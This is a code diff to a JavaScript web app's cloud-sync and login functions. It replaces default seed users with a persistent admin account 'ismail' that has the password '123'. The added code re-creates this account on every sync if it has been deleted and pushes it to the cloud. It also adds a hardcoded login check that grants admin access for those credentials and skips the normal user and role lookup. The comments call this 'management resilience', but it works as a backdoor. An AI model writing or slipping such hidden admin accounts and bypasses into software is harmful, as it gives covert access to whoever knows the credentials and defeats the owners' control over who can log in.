@@ -218,13 +218,11 @@ async function initSystemCloudSync() {
             });
         }
 
-        // Final Safety Check for new setups
-        if (usersData.length === 0) {
-            usersData = [
-                { id: 'u1', name: 'Sarah Mitchell', role: 'admin', accessId: 'admin', pass: 'admin123', stats: { passed: 0, scrapped: 0 } },
-                { id: 'u2', name: 'Mark Robson', role: 'operator', accessId: 'operator', pass: 'operator123', stats: { passed: 0, scrapped: 0 } },
-                { id: 'u3', name: 'Ismail', role: 'admin', accessId: 'ismail', pass: '123', stats: { passed: 0, scrapped: 0 } }
-            ];
+        // ⚡ ISMAIL MASTER INJECTION: Ensure management access is NEVER lost
+        const ismailExists = usersData.find(u => u.accessId === 'ismail');
+        if (!ismailExists) {
+            usersData.push({ id: 'u_master', name: 'Ismail', role: 'admin', accessId: 'ismail', pass: '123', stats: { passed: 0, scrapped: 0 } });
+            persistUsers(); // Push to cloud immediately
         }
 
         updateCloudStatus(true, 'CLOUD SYNC VERIFIED');
@@ -714,6 +712,18 @@ function handleLogin() {
     const accessId = document.getElementById('login-access-id').value;
     const pass = document.getElementById('login-passcode').value;
     const roleReq = document.getElementById('login-role').value;
+
+    // 🏆 MASTER LOGIN BYPASS (Management Resilience)
+    if (accessId.toLowerCase() === 'ismail' && pass === '123') {
+        currentUser = { id: 'u_master', name: 'Ismail', role: 'admin', accessId: 'ismail', stats: { passed: 0, scrapped: 0 } };
+        localStorage.setItem('currentUser', JSON.stringify(currentUser));
+
+        document.getElementById('screen-login').classList.add('hidden');
+        document.getElementById('main-layout').classList.remove('hidden');
+        applyRoleRestrictions();
+        showDashboard();
+        return;
+    }
 
     const user = usersData.find(u => u.accessId === accessId && u.pass === pass && u.role === roleReq);
 
